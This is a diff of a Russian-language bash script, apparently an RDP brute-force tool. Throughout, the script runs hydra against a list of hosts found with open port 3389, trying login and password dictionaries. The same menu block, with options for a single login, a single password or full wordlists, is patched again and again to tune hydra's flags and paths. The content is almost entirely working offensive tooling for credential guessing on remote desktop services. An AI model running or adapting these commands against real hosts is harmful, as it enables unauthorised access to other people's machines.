@@ -11094,6 +11710,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -11105,7 +11725,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11115,7 +11735,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11125,7 +11745,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11134,7 +11754,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11163,6 +11783,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -11174,7 +11798,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11184,7 +11808,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11194,7 +11818,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11203,7 +11827,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11232,6 +11856,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -11243,7 +11871,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11253,7 +11881,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11263,7 +11891,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11272,7 +11900,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11301,6 +11929,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -11312,7 +11944,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11322,7 +11954,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11332,7 +11964,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11341,7 +11973,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11370,6 +12002,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -11381,7 +12017,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11391,7 +12027,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11401,7 +12037,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11410,7 +12046,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11439,6 +12075,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -11450,7 +12090,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11460,7 +12100,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11470,7 +12110,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11479,7 +12119,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11508,6 +12148,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -11519,7 +12163,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11529,7 +12173,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11539,7 +12183,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11548,7 +12192,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11577,6 +12221,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -11588,7 +12236,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11598,7 +12246,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11608,7 +12256,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11617,7 +12265,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11646,6 +12294,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -11657,7 +12309,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11667,7 +12319,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11677,7 +12329,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11686,7 +12338,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11715,6 +12367,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -11726,7 +12382,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11736,7 +12392,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11746,7 +12402,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11755,7 +12411,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11784,6 +12440,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -11795,7 +12455,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11805,7 +12465,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11815,7 +12475,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11824,7 +12484,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11853,6 +12513,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -11864,7 +12528,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11874,7 +12538,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11884,7 +12548,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11893,7 +12557,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11920,6 +12584,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -11931,7 +12599,7 @@ read -p "   Выбор из меню : " brutmenu
